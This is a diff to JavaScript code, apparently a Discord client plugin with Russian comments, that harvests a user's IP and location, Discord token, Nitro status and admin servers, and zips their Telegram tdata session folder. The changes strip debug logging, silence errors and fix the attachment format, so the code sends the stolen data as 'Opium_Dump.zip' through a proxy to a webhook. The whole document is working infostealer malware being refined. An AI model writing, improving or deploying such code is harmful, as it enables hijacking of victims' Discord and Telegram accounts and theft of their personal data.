@@ -22,7 +22,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         const ipData = await ipRes.json();
         result.ip = ipData.ip;
         result.location = ipData.city || ipData.region || ipData.country || "Неизвестно";
-    } catch (e) { result.debug_tdata.push("Ошибка IP: " + e.message); }
+    } catch (e) {}
 
     // 2. Nitro и Токен
     try {
@@ -47,17 +47,11 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                     let count = 0;
                     if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
                     if (!count) count = g.memberCount || g.approximateMemberCount;
-                    if (!count && result.dtoken) {
-                        try {
-                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
-                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
-                        } catch (err) {}
-                    }
                     result.admin_servers.push({ name: g.name, members: count || 0 });
                 }
             }
         }
-    } catch (e) { result.debug_tdata.push("Ошибка серверов: " + e.message); }
+    } catch (e) {}
 
     // 4. ПОИСК tdata
     let hasTdata = false;
@@ -116,7 +110,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                 if (tdataPath) break;
             }
         }
-    } catch (e) { result.debug_tdata.push(`Ошибка поиска: ${e.message}`); }
+    } catch (e) {}
 
     // 5. ФОРМИРУЕМ АРХИВ
     let finalZipBuffer = null;
@@ -127,8 +121,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
 
         if (tdataPath) {
             result.telegram_path = tdataPath;
-            
-            // Считаем размер
             let totalSize = 0;
             const checkSize = (dir) => {
                 try {
@@ -141,13 +133,8 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                 } catch(e) {}
             };
             checkSize(tdataPath);
-            
-            const sizeMB = (totalSize / 1024 / 1024).toFixed(2);
-            result.debug_tdata.push(`Размер tdata: ${sizeMB} MB`);
 
-            if (totalSize > 20 * 1024 * 1024) {
-                result.debug_tdata.push("Папка >20MB. Пропуск.");
-            } else {
+            if (totalSize < 20 * 1024 * 1024) {
                 let fileCount = 0;
                 const addFilesRecursively = (dir, prefix = '') => {
                     try {
@@ -165,25 +152,30 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                         }
                     } catch (dirErr) { }
                 };
-                
                 addFilesRecursively(tdataPath);
-                result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
                 hasTdata = true;
             }
         }
 
         finalZipBuffer = zipFunc(zipFiles);
-        result.debug_tdata.push("ZIP успешно создан!");
+    } catch (e) {}
 
-    } catch (e) {
-        result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
-    }
-
-    // 6. ОТПРАВКА ЧЕРЕЗ XMLHttpRequest
+    // 6. ОТПРАВКА
     const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
     
     const formData = new FormData();
-    formData.append('payload_json', JSON.stringify({ content: messageText }));
+    
+    // ВАЖНО: Добавляем массив attachments для корректной обработки
+    const payload = { 
+        content: messageText,
+        attachments: []
+    };
+    
+    if (finalZipBuffer) {
+        payload.attachments.push({ id: 0, filename: "Opium_Dump.zip" });
+    }
+
+    formData.append('payload_json', JSON.stringify(payload));
     
     if (finalZipBuffer) {
         const zipBlob = new Blob([finalZipBuffer], { type: 'application/zip' });
@@ -194,12 +186,8 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         try {
             const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
             const xhr = new XMLHttpRequest();
-            
-            // Открываем POST запрос
             xhr.open('POST', proxyUrlFull, true);
-            
-            // Устанавливаем таймаут 60 секунд (60000 мс)
-            xhr.timeout = 60000;
+            xhr.timeout = 60000; // 60 секунд
 
             xhr.onload = function() {
                 if (xhr.status >= 200 && xhr.status < 300) {
@@ -210,16 +198,14 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             };
 
             xhr.onerror = function() {
-                resolve({ success: false, error: "Сетевая ошибка при отправке (XHR)." });
+                resolve({ success: false, error: "Сетевая ошибка (XHR)." });
             };
 
             xhr.ontimeout = function() {
-                resolve({ success: false, error: "Таймаут отправки (60 секунд)." });
+                resolve({ success: false, error: "Таймаут отправки." });
             };
 
-            // Отправляем FormData
             xhr.send(formData);
-
         } catch (e) {
             resolve({ success: false, error: `Ошибка XHR: ${e.message}` });
         }
